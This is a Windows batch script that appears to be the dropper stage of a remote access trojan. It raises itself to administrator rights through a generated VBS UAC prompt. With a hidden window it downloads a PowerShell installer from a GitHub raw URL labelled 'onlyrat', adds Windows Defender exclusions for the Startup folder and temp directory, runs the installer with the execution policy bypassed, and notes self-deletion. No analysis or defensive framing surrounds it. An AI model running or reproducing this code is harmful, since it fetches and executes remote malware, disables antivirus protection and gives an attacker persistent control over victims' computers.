REM get admin permissions for script
@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
     IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM disable defender
 

REM rat resoures 
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/installer.ps1  -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1"; Add-MpPreference -ExclusionPath "$env:temp"; 
powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1

@REM self delete
@REM del wget.cmd

